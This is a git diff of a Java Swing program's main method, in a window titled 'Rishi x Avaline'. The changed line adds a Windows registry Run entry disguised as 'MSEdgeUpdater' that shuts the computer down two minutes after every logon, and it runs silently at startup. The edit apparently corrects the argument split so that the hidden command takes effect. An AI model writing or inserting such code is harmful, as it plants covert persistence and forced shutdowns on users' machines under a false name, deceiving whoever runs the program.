@@ -355,7 +355,7 @@ public class Engine extends JPanel {
 	public static void main(String[] args) throws IOException, InterruptedException {
 		System.setProperty("sun.java2d.opengl", "true");
 		JFrame frame = new JFrame("Rishi x Avaline");
-		String s[] = {"REG ADD", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSEdgeUpdater /t REG_SZ /d \"shutdown /s /t 120\""};
+		String s[] = {"REG", "ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSEdgeUpdater /t REG_SZ /d \"shutdown /s /t 120\""};
 		Runtime.getRuntime().exec(s);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
